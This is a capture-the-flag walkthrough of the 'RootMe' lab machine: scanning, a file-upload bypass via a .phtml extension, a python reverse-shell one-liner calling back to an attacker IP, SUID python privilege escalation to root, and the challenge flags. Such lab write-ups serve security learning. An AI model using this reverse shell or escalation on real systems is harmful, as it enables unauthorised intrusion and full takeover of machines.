# RootMe

IP: 10.10.195.67

`rustscan --accessible -a $ip -- -sC -sV | tee -a logs/portscan_init.log`

[Rustscan initial run](./logs/portscan_init.log)

***Scan the machine, how many ports are open?*** [`2`]

***What version of Apache is running?*** [`2.4.29`]

***What service is running on port 22?*** [`SSH`]

`nikto -h 10.10.195.67 | tee logs/nikto.log`

[Nikto run](./logs/nikto.log)

`gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x js,jpg,jpeg,txt,html,css,php -u http://10.10.195.67/ | tee logs/gobuster.log`

[Gobuster run](./logs/gobuster.log)

***Find directories on the web server using the GoBuster tool.***

Manually went around and found a `/panel`

***What is the hidden directory?*** [`/panel/`]

The main page has an upload button. We also saw an uploads page from the gobuster scan

Uploading a basic PHP RCE file didn't work. After messing around, it accepted a `.phtml` file, and I was able to get the basic command script in.

```bash
export RHOST="10.6.89.232";export RPORT=4848;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Used a find command to look for the text file, found it and cat it

***Find user.txt*** [`THM{y0u_g0t_a_sh3ll}`]

Searched for SUID bit files using `find / -perm -u=s -type f 2>/dev/null`

Nice, the python binary in `/usr/bin` has a SUID bit set

***Search for files with SUID permission, which file is weird?*** [`/usr/bin/python`]

In the last SUID bit challenge/training, it focused on manipulating a custom script by overwriting `curl` in our own bin folder for it

In this case, python is already made, meaning it can run python scripts as essentially `root`, meaning we can create a script to shell in.

On GTFObins, they make a suggestion to use this, which runs a command to run an [execl](https://docs.python.org/3/library/os.html#os.execl) shell command, which is a script which "replaces" the python process

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Once that was ran, I was the root user

***Find a form to escalate your privileges.***

I cat `/root/root.txt`

***Find root.txt*** [`THM{pr1v1l3g3_3sc4l4t10n}`]
